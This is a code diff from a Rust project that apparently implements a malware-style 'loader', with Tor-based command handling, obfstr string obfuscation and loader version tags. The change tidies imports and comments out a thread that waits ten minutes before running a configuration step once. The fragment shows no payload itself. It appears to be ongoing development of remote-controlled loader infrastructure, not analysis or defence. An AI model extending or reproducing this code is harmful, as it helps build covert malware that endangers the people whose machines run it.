@@ -1,11 +1,8 @@
-use std::{ sync::{ Arc, Mutex, RwLock }, time::Duration };
+use std::sync::{ Arc, Mutex, RwLock };
 use anyhow::{ Context, Result };
 use loader_vars::{
     constants::{ loader_tag, loader_version },
-    types::{
-        receive::{ self, ClPrms, LdrRcv, RnCnfgPrms },
-        send::{ GtCnfgPrms, LdrSnd, SrvAct, SrvPrms },
-    },
+    types::{ receive::{ self, ClPrms, LdrRcv }, send::{ GtCnfgPrms, LdrSnd, SrvAct, SrvPrms } },
 };
 use shared::network::tor::{ LoggerCnfg, MutexPtr, RwPtr, SrvRcvTp, TrHandler };
 use obfstr::obfstr as s;
@@ -28,17 +25,15 @@ impl LdrTrHandler {
         let self_clone = Arc::new(RwLock::new(self.clone()));
         let self_clone2 = self_clone.clone();
 
-        let self_clone3 = self_clone.clone();
-
-        std::thread::spawn(move || {
-            std::thread::sleep(Duration::from_secs(60 * 10));
-            let binding = self_clone3.write().unwrap();
-            let mut run_config_done = binding.cnfg_done.lock().unwrap();
-            if !*run_config_done {
-                run_config(RnCnfgPrms::default()).unwrap();
-                *run_config_done = true;
-            }
-        });
+        // std::thread::spawn(move || {
+        //     std::thread::sleep(Duration::from_secs(60 * 10));
+        //     let binding = self_clone3.write().unwrap();
+        //     let mut run_config_done = binding.cnfg_done.lock().unwrap();
+        //     if !*run_config_done {
+        //         run_config(RnCnfgPrms::default()).unwrap();
+        //         *run_config_done = true;
+        //     }
+        // });
 
         self.tr_handler.run(
             move || {
